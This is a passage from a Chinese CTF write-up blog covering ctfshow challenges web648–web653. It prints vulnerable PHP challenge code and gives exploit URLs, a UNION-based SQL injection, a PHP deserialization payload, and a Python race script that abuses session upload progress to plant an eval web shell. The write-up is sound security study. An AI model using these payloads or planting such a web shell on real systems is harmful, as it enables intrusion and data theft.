Header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">            Header(&quot;Accept-Ranges: bytes&quot;);</span><br><span class="line">            Header(&quot;Accept-Length: &quot; . filesize($file_name));</span><br><span class="line">            Header(&quot;Content-Disposition: attachment; filename=backup.dat&quot;);</span><br><span class="line">            </span><br><span class="line">            $fileContent = fread($file, filesize($file_name));</span><br><span class="line">            $filteredContent = str_replace(self::FLAG645, &#x27;flag就在这里，可惜不能给你&#x27;, $fileContent);</span><br><span class="line">            </span><br><span class="line">            echo $filteredContent;</span><br><span class="line">            fclose($file);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 生成随机数组</span><br><span class="line">     */</span><br><span class="line">    public static function getArray($total, $times, $min, $max)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">        </span><br><span class="line">        if ($min * $times &gt; $total || $max * $times &lt; $total) &#123;</span><br><span class="line">            return [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while ($times &gt;= 1) &#123;</span><br><span class="line">            $times--;</span><br><span class="line">            $kmix = max($min, $total - $times * $max);</span><br><span class="line">            $kmax = min($max, $total - $times * $min);</span><br><span class="line">            $kAvg = $total / ($times + 1);</span><br><span class="line">            $kDis = min($kAvg - $kmix, $kmax - $kAvg);</span><br><span class="line">            $r = ((float)(rand(1, 10000) / 10000) - 0.5) * $kDis * 2;</span><br><span class="line">            $k = round($kAvg + $r);</span><br><span class="line">            $total -= $k;</span><br><span class="line">            $data[] = $k;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 恢复用户数据</span><br><span class="line">     */</span><br><span class="line">    public static function recoveryUsers()</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;恢复成功&#x27;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        if (isset($_FILES[&#x27;file&#x27;]) &amp;&amp; $_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &lt; 1024 * 1024) &#123;</span><br><span class="line">            $file_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $result = move_uploaded_file($file_name, self::DB_PATH);</span><br><span class="line">            </span><br><span class="line">            if ($result === false) &#123;</span><br><span class="line">                $ret[&#x27;message&#x27;] = &#x27;数据恢复失败 file_name: &#x27; . $file_name . &#x27; DB_PATH: &#x27; . self::DB_PATH;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ret[&#x27;message&#x27;] = &#x27;数据恢复失败&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 验证授权密钥</span><br><span class="line">     */</span><br><span class="line">    public static function authKeyValidate($auth)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; $auth == substr(self::FLAG645, 8) ? &#x27;验证成功&#x27; : &#x27;验证失败&#x27;,</span><br><span class="line">            &#x27;status&#x27; =&gt; $auth == substr(self::FLAG645, 8) ? &#x27;0&#x27; : &#x27;-1&#x27;</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 远程更新</span><br><span class="line">     */</span><br><span class="line">    public static function remoteUpdate($auth, $address)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;更新失败&#x27;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        if ($auth !== substr(self::FLAG645, 8)) &#123;</span><br><span class="line">            $ret[&#x27;message&#x27;] = &#x27;权限key验证失败&#x27;;</span><br><span class="line">            return json_encode($ret);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents($address);</span><br><span class="line">        $ret[&#x27;message&#x27;] = ($content !== false ? $content : &#x27;地址不可达&#x27;);</span><br><span class="line"></span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 字符串验证函数</span><br><span class="line">     */</span><br><span class="line">    public static function evilString($m)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = &#x27;372619038&#x27;;</span><br><span class="line">        $content = call_user_func($m);</span><br><span class="line">        </span><br><span class="line">        if (stripos($content, $key) !== false) &#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;you are not 372619038?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 类验证函数</span><br><span class="line">     */</span><br><span class="line">    public static function evilClass($m, $k)</span><br><span class="line">    &#123;</span><br><span class="line">        class CTFShow</span><br><span class="line">        &#123;</span><br><span class="line">            public $m;</span><br><span class="line">            </span><br><span class="line">            public function __construct($m)</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;m = $m;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ctfshow = new CTFShow($m);</span><br><span class="line">        $ctfshow-&gt;m = $m;</span><br><span class="line">        </span><br><span class="line">        if ($ctfshow-&gt;m == $m &amp;&amp; $k == shell_exec(&#x27;cat /FLAG/FLAG647&#x27;)) &#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG648&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;mmmmm?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 数字验证函数</span><br><span class="line">     */</span><br><span class="line">    public static function evilNumber($m, $k)</span><br><span class="line">    &#123;</span><br><span class="line">        $number = self::getArray(1000, 20, 10, 999);</span><br><span class="line">        </span><br><span class="line">        if (isset($number[$m]) &amp;&amp; $number[$m] == $m &amp;&amp; $k == shell_exec(&#x27;cat /FLAG/FLAG648&#x27;)) &#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG649&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;number is right?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 函数验证</span><br><span class="line">     */</span><br><span class="line">    public static function evilFunction($m, $k)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = &#x27;ffffffff&#x27;;</span><br><span class="line">        $content = call_user_func($m);</span><br><span class="line">        </span><br><span class="line">        if (stripos($content, $key) !== false &amp;&amp; $k == shell_exec(&#x27;cat /FLAG/FLAG649&#x27;)) &#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG650&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;you are not ffffffff?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 数组验证</span><br><span class="line">     */</span><br><span class="line">    public static function evilArray($m, $k)</span><br><span class="line">    &#123;</span><br><span class="line">        $arrays = unserialize($m);</span><br><span class="line">        </span><br><span class="line">        if ($arrays !== false) &#123;</span><br><span class="line">            $isValid = array_key_exists(&#x27;username&#x27;, $arrays) &amp;&amp; </span><br><span class="line">                       in_array(&#x27;ctfshow&#x27;, get_object_vars($arrays)) &amp;&amp; </span><br><span class="line">                       $k == shell_exec(&#x27;cat /FLAG/FLAG650&#x27;);</span><br><span class="line">            </span><br><span class="line">            if ($isValid) &#123;</span><br><span class="line">                echo shell_exec(&#x27;cat /FLAG/FLAG651&#x27;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &#x27;array?&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 网络测试</span><br><span class="line">     */</span><br><span class="line">    public static function netTest($cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;命令执行失败&#x27;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        if (preg_match(&#x27;/^[A-Za-z]+$/&#x27;, $cmd)) &#123;</span><br><span class="line">            $res = shell_exec($cmd);</span><br><span class="line">            </span><br><span class="line">            if (stripos(PHP_OS, &#x27;WIN&#x27;) !== false) &#123;</span><br><span class="line">                $ret[&#x27;message&#x27;] = iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, $res);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $ret[&#x27;message&#x27;] = $res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * PHP信息测试</span><br><span class="line">     */</span><br><span class="line">    public static function phpInfoTest()</span><br><span class="line">    &#123;</span><br><span class="line">        return phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 使用示例</span><br><span class="line">/*</span><br><span class="line">$userData = file_get_contents(UserManager::DB_PATH);</span><br><span class="line">$users = UserManager::getUsers($userData, 1, 10);</span><br><span class="line">echo $users;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>重点看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># /system36d/users.php</span><br><span class="line">$a=$_GET[&#x27;action&#x27;];</span><br><span class="line">switch ($a) &#123;</span><br><span class="line">        # ...</span><br><span class="line">    case &#x27;evilClass&#x27;:</span><br><span class="line">        evilClass($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">function evilClass($m,$k)&#123;</span><br><span class="line">    class ctfshow&#123;</span><br><span class="line">        public $m;</span><br><span class="line">        public function __construct($m)&#123;</span><br><span class="line">            $this-&gt;$m=$m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ctfshow=new ctfshow($m);</span><br><span class="line">    $ctfshow-&gt;$m=$m;</span><br><span class="line">    if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG647&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG648&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;mmmmm?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传参即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show/system36d/users.php?action=evilClass&amp;key=flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;&amp;m=</span><br></pre></td></tr></table></figure>

<p>获得flag</p>
<p>flag_648&#x3D;ctfshow{af5b5e411813eafd8dc2311df30b394e}</p>
<h1 id="web649"><a href="#web649" class="headerlink" title="web649"></a>web649</h1><p>查看代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    /**</span><br><span class="line">     * 生成随机数组</span><br><span class="line">     */</span><br><span class="line">    public static function getArray($total, $times, $min, $max)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">        </span><br><span class="line">        if ($min * $times &gt; $total || $max * $times &lt; $total) &#123;</span><br><span class="line">            return [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while ($times &gt;= 1) &#123;</span><br><span class="line">            $times--;</span><br><span class="line">            $kmix = max($min, $total - $times * $max);</span><br><span class="line">            $kmax = min($max, $total - $times * $min);</span><br><span class="line">            $kAvg = $total / ($times + 1);</span><br><span class="line">            $kDis = min($kAvg - $kmix, $kmax - $kAvg);</span><br><span class="line">            $r = ((float)(rand(1, 10000) / 10000) - 0.5) * $kDis * 2;</span><br><span class="line">            $k = round($kAvg + $r);</span><br><span class="line">            $total -= $k;</span><br><span class="line">            $data[] = $k;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">   public static function evilNumber($m, $k)</span><br><span class="line">    &#123;</span><br><span class="line">        $number = self::getArray(1000, 20, 10, 999);</span><br><span class="line">        </span><br><span class="line">        if (isset($number[$m]) &amp;&amp; $number[$m] == $m &amp;&amp; $k == shell_exec(&#x27;cat /FLAG/FLAG648&#x27;)) &#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG649&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;number is right?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ````</span><br><span class="line"></span><br><span class="line">payload:</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show/system36d/users.php?action=evilNumber&key=flag_648=ctfshow%7Baf5b5e411813eafd8dc2311df30b394e%7D&m=">https://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show/system36d/users.php?action=evilNumber&amp;key=flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}&amp;m=</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">m置空即可</span><br><span class="line"></span><br><span class="line">得到`flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;`</span><br><span class="line"></span><br><span class="line"># web650</span><br></pre></td></tr></table></figure>
<p>$a&#x3D;$_GET[‘action’];<br>switch ($a) {<br>        # …<br>    case ‘evilFunction’:<br>        evilFunction($_GET[‘m’],$_GET[‘key’]);<br>        break;<br>}<br>function evilFunction($m,$k){<br>    $key &#x3D; ‘ffffffff’;<br>    $content &#x3D; call_user_func($m);<br>    if(stripos($content, $key)!&#x3D;&#x3D;FALSE &amp;&amp; $k&#x3D;&#x3D;shell_exec(‘cat &#x2F;FLAG&#x2F;FLAG649’)){<br>        echo shell_exec(‘cat &#x2F;FLAG&#x2F;FLAG650’);<br>    }else{<br>        echo ‘you are not ffffffff?’;<br>    }<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查找存在ffffffff的函数即可。</span><br></pre></td></tr></table></figure>
<p>&#x2F;system36d&#x2F;users.phpaction&#x3D;evilFunction&amp;key&#x3D;flag_649&#x3D;ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}&amp;m&#x3D;phar::createDefaultStub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br><span class="line"></span><br><span class="line"># web651</span><br></pre></td></tr></table></figure>
<p>function evilArray($m,$k){<br>    $arrays&#x3D;unserialize($m);<br>    if($arrays!&#x3D;&#x3D;false){<br>        if(array_key_exists(‘username’, $arrays) &amp;&amp; in_array(‘ctfshow’, get_object_vars($arrays)) &amp;&amp;  $k&#x3D;&#x3D;shell_exec(‘cat &#x2F;FLAG&#x2F;FLAG650’)){<br>            echo shell_exec(‘cat &#x2F;FLAG&#x2F;FLAG651’);<br>        }else{<br>            echo ‘array?’;<br>        }<br>    }<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">序列化构造。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<?php 
class ctfshow{    
		public $username="ctfshow";
}
$a=new ctfshow();
echo serialize($a);
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br><span class="line"></span><br><span class="line"># web652</span><br><span class="line"></span><br><span class="line">```# /page.php</span><br><span class="line">page.php</span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">include __DIR__.DIRECTORY_SEPARATOR.&#x27;system36d/util/dbutil.php&#x27;;</span><br><span class="line">$id = isset($_GET[&#x27;id&#x27;])?$_GET[&#x27;id&#x27;]:&#x27;1&#x27;;</span><br><span class="line">// 转义&#x27;来实现防注入</span><br><span class="line">$id = addslashes($id);</span><br><span class="line">$name = db::get_username($id);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><figcaption><span>/system36d/util/dbutil.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/system36d/util/dbutil.php</span><br><span class="line">&lt;?php</span><br><span class="line">    class db&#123;</span><br><span class="line">    private static $host=&#x27;localhost&#x27;;</span><br><span class="line">    private static $username=&#x27;root&#x27;;</span><br><span class="line">    private static $password=&#x27;root&#x27;;</span><br><span class="line">    private static $database=&#x27;ctfshow&#x27;;</span><br><span class="line">    private static $conn;</span><br><span class="line">    public static function get_key()&#123;</span><br><span class="line">        $ret = &#x27;&#x27;;</span><br><span class="line">        $conn = self::get_conn();</span><br><span class="line">        $res = $conn-&gt;query(&#x27;select `key` from ctfshow_keys&#x27;);</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            $row = $res-&gt;fetch_array(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        $ret = $row[&#x27;key&#x27;];</span><br><span class="line">        self::close();</span><br><span class="line">        return $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    public static function get_username($id)&#123;</span><br><span class="line">        $ret = &#x27;&#x27;;</span><br><span class="line">        $conn = self::get_conn();</span><br><span class="line">        $res = $conn-&gt;query(&quot;select `username` from ctfshow_users where id = ($id)&quot;);</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            $row = $res-&gt;fetch_array(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        $ret = $row[&#x27;username&#x27;];</span><br><span class="line">        self::close();</span><br><span class="line">        return $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    private static function get_conn()&#123; </span><br><span class="line">        if(self::$conn==null)&#123;</span><br><span class="line">            self::$conn = new mysqli(self::$host, self::$username, self::$password, self::$database);</span><br><span class="line">        &#125;</span><br><span class="line">        return self::$conn;</span><br><span class="line">    &#125;</span><br><span class="line">    private static function close()&#123;</span><br><span class="line">        if(self::$conn!==null)&#123;</span><br><span class="line">            self::$conn-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sql注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:https://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show/page.php?id=10)%20union%20select%20secret%20as%20username%20from%20ctfshow_secret%20where%201%20=(1</span><br></pre></td></tr></table></figure>

<p>拿到flag_652&#x3D;ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:https://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show//page.php?id=10)%20union%20select%20`key`%20as%20username%20from%20ctfshow_keys%20where%201%20=(1</span><br></pre></td></tr></table></figure>

<p>拿到key:key_is_here_you_know</p>
<h1 id="web653"><a href="#web653" class="headerlink" title="web653"></a>web653</h1><figure class="highlight plaintext"><figcaption><span>/var/www/html/system36d/util/common.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#x27;dbutil.php&#x27;;</span><br><span class="line">if($_GET[&#x27;k&#x27;]!==shell_exec(&#x27;cat /FLAG/FLAG651&#x27;))&#123;</span><br><span class="line">    die(&#x27;651flag未拿到&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;file&#x27;]) &amp;&amp; file_exists($_POST[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if(db::get_key()==$_POST[&#x27;key&#x27;])&#123;</span><br><span class="line">        include __DIR__.DIRECTORY_SEPARATOR.$_POST[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>session包含。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = &quot;http://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show//system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&quot;</span><br><span class="line">url2 = &quot;http://5e5a4408-6fb2-4b89-ad5f-c71be0e2163b.challenge.ctf.show//index.php&quot;</span><br><span class="line">sessionid = &quot;chino&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;key&#x27;: &#x27;key_is_here_you_know&#x27;,</span><br><span class="line">    &#x27;file&#x27;: &#x27;../../../../../tmp/sess_&#x27; + sessionid,</span><br><span class="line">    # /var/www/html/system36d/util/dbutil.php</span><br><span class="line">    &#x27;1&#x27;: &#x27;&#x27;&#x27;file_put_contents(&#x27;chino.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&#x27;&#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(session):</span><br><span class="line">    filebytes = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">    while True:</span><br><span class="line">        resp = session.post(url2,</span><br><span class="line">                            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&#125;,</span><br><span class="line">                            files=&#123;&#x27;file&#x27;: (&#x27;chino.png&#x27;, filebytes)&#125;,</span><br><span class="line">                            cookies=&#123;&#x27;PHPSESSID&#x27;: sessionid&#125;)</span><br><span class="line">        print(&quot;[*]writing...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(session):</span><br><span class="line">    while True:</span><br><span class="line">        resp = session.post(url, data=data, cookies=&#123;&#x27;PHPSESSID&#x27;: sessionid&#125;)</span><br><span class="line">        if &#x27;chino.png&#x27; or &#x27;offset: 1&#x27; in resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[*]status:&quot; + str(resp.status_code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    with requests.session() as session:</span><br><span class="line">        for i in range(5):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        for i in range(5):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat /secret.txt`</span><br></pre></td></tr></table></figure>

<p>即可</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>伊卡洛维奇</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://lunereal.1kal0vic.top/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/" title="ctfshow终极考核">http://lunereal.1kal0vic.top/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" 